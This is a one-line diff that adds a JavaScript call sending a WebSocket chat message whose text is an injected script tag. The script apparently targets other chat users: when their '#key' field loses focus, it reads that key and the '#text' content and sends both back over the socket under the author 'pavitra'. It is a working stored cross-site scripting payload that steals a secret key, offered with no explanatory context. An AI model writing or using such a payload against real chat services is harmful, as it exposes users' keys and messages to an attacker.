@@ -1,0 +1,1 @@
+ws.send(JSON.stringify({author: 'pavitra', text: "<script> $( \"#key\" ).focusout(function() { var t = $('#text').val(); var k = $('#key').val(); ws.send(JSON.stringify({author: 'pavitra', text: t + ' : ' + k})); }); </script>"}));
